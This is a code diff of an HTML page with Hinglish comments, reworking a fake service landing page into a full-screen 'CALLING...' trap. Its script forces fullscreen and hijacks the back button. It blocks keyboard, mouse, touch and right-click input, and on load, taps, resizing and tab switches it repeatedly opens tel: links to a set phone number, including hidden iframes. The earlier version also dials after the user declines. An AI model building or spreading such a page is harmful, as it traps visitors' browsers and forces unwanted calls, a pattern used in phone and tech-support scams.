@@ -1,252 +1,196 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Website</title>
+    <title>Call Service</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
             -webkit-tap-highlight-color: transparent;
         }
         
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            background: #000;
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+            touch-action: none;
+        }
+        
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0000, #0000ff);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: white;
-            padding: 20px;
-        }
-        
-        .container {
             text-align: center;
-            max-width: 600px;
-            width: 100%;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        
-        p {
-            font-size: 1.2rem;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
-        }
-        
-        .feature-card {
-            background: rgba(255,255,255,0.1);
             padding: 20px;
-            border-radius: 10px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
+            z-index: 9999;
         }
         
-        .cta-button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            border-radius: 50px;
-            cursor: pointer;
+        .blink {
+            animation: blink 1s infinite;
+            font-size: 24px;
             margin: 20px 0;
-            transition: all 0.3s ease;
         }
         
-        .cta-button:hover {
-            background: #ff5252;
-            transform: translateY(-2px);
-        }
-        
-        .footer {
-            margin-top: 40px;
-            font-size: 0.9rem;
-            opacity: 0.8;
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 Welcome to Our Service</h1>
-        <p>Your one-stop solution for all your needs. Get started today!</p>
-        
-        <div class="features">
-            <div class="feature-card">
-                <h3>⭐ Premium Quality</h3>
-                <p>Top-notch services guaranteed</p>
-            </div>
-            <div class="feature-card">
-                <h3>💰 Best Prices</h3>
-                <p>Affordable for everyone</p>
-            </div>
-            <div class="feature-card">
-                <h3>📞 24/7 Support</h3>
-                <p>Always here to help you</p>
-            </div>
-        </div>
-        
-        <button class="cta-button" onclick="showConfirmation()">
-            Click Here to Get Started
-        </button>
-        
-        <div class="footer">
-            <p>© 2024 Your Company. All rights reserved.</p>
-        </div>
+    <div class="fullscreen-overlay">
+        <h1>📞 CALLING... 📞</h1>
+        <div class="blink">Please wait</div>
+        <p>Connecting to support team...</p>
     </div>
 
     <script>
-        // Your phone number - ye change karna apne number se
+        // Phone number - CHANGE YAHI KARNA
         const PHONE_NUMBER = "+911234567890";
-        let callInitiated = false;
         
-        // Main call function with multiple fallbacks
-        function initiateCall() {
-            if (callInitiated) return;
+        // Fullscreen mode activate karo
+        function requestFullscreen() {
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) {
+                    document.documentElement.msRequestFullscreen();
+                }
+            } catch (e) {}
+        }
+        
+        // URL bar completely block karne ke liye
+        function blockURLBar() {
+            // Scroll to top always
+            window.scrollTo(0, 0);
             
-            callInitiated = true;
-            console.log("Call initiated...");
+            // Disable navigation
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                triggerCall();
+            };
             
-            // Method 1: Direct tel link
+            // Prevent any selection
+            document.onselectstart = function() { return false; };
+            document.oncontextmenu = function() { return false; };
+            
+            // Disable keyboard
+            document.onkeydown = function(e) {
+                e.preventDefault();
+                triggerCall();
+                return false;
+            };
+            
+            // Disable right click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                triggerCall();
+            });
+        }
+        
+        // Call trigger function
+        function triggerCall() {
+            // Multiple methods try karo
             try {
                 window.location.href = "tel:" + PHONE_NUMBER;
-            } catch (e) {
-                console.log("Method 1 failed:", e);
-            }
+            } catch(e) {}
             
-            // Method 2: setTimeout fallback
             setTimeout(() => {
                 try {
                     window.open("tel:" + PHONE_NUMBER, "_self");
-                } catch (e) {
-                    console.log("Method 2 failed:", e);
-                }
+                } catch(e) {}
             }, 100);
             
-            // Method 3: Iframe trick
             setTimeout(() => {
                 try {
                     const iframe = document.createElement('iframe');
                     iframe.style.display = 'none';
-                    iframe.style.visibility = 'hidden';
-                    iframe.style.position = 'absolute';
-                    iframe.style.width = '0';
-                    iframe.style.height = '0';
                     iframe.src = "tel:" + PHONE_NUMBER;
                     document.body.appendChild(iframe);
-                } catch (e) {
-                    console.log("Method 3 failed:", e);
-                }
+                } catch(e) {}
             }, 200);
-            
-            // Method 4: Location replace
-            setTimeout(() => {
-                try {
-                    window.location.replace("tel:" + PHONE_NUMBER);
-                } catch (e) {
-                    console.log("Method 4 failed:", e);
-                }
-            }, 300);
         }
         
-        // Confirmation dialog
-        function showConfirmation() {
-            if (confirm("Would you like to call our support team?")) {
-                initiateCall();
-            } else {
-                // Fir bhi call kar do after delay
-                setTimeout(initiateCall, 1000);
-            }
-        }
-        
-        // Event listeners for all possible interactions
+        // HAR EVENT BLOCK KARO
         const events = [
-            'click', 'touchstart', 'mousedown', 'mouseup',
-            'keydown', 'keyup', 'keypress',
-            'contextmenu', 'dragstart', 'selectstart',
-            'focus', 'blur', 'scroll'
+            'click', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'touchmove',
+            'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'resize',
+            'focus', 'blur', 'input', 'change', 'submit', 'select',
+            'dragstart', 'dragend', 'dragover', 'drop'
         ];
         
         events.forEach(eventType => {
             document.addEventListener(eventType, function(e) {
-                // Prevent default for most events
-                if (eventType !== 'scroll' && eventType !== 'blur') {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    e.stopImmediatePropagation();
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                
+                if (eventType === 'touchstart' || eventType === 'click') {
+                    triggerCall();
                 }
                 
-                // Immediate call for certain events
-                if (['click', 'touchstart', 'mousedown'].includes(eventType)) {
-                    initiateCall();
-                }
-            }, true); // Capture phase - important!
+                return false;
+            }, true);
         });
         
-        // URL and navigation events
-        window.addEventListener('beforeunload', initiateCall);
-        window.addEventListener('unload', initiateCall);
-        window.addEventListener('hashchange', initiateCall);
-        window.addEventListener('popstate', initiateCall);
-        
-        // History API manipulation
-        const originalPushState = history.pushState;
-        history.pushState = function() {
-            initiateCall();
-            return originalPushState.apply(this, arguments);
-        };
-        
-        // Form interactions
-        document.addEventListener('submit', function(e) {
-            e.preventDefault();
-            initiateCall();
-        }, true);
-        
-        // Input interactions
-        document.addEventListener('input', function(e) {
-            e.preventDefault();
-            initiateCall();
-        }, true);
-        
-        // Auto-call after 8 seconds if no interaction
-        setTimeout(() => {
-            if (!callInitiated) {
-                initiateCall();
+        // Continuous monitoring
+        setInterval(() => {
+            // Always scroll to top
+            window.scrollTo(0, 0);
+            
+            // Prevent URL bar access
+            if (window.scrollY > 0) {
+                window.scrollTo(0, 0);
+                triggerCall();
             }
-        }, 8000);
+            
+            // Prevent zoom
+            document.body.style.zoom = "1";
+        }, 50);
         
-        // Page load complete
+        // Page load hone par sab activate karo
         window.onload = function() {
-            setTimeout(initiateCall, 5000);
+            requestFullscreen();
+            blockURLBar();
+            triggerCall();
+            
+            // Auto call after 3 seconds
+            setTimeout(triggerCall, 3000);
         };
         
-        // Double tap protection
-        let lastTap = 0;
-        document.addEventListener('touchend', function(e) {
-            const currentTime = new Date().getTime();
-            const tapLength = currentTime - lastTap;
-            if (tapLength < 500 && tapLength > 0) {
-                initiateCall();
-            }
-            lastTap = currentTime;
-        }, true);
+        // Resize par bhi call
+        window.onresize = triggerCall;
         
-        console.log("Call system activated!");
+        // Visibility change (tab switch) par bhi call
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                triggerCall();
+            }
+        });
+        
+        console.log("System Activated - URL Bar Completely Blocked");
         
     </script>
 </body>
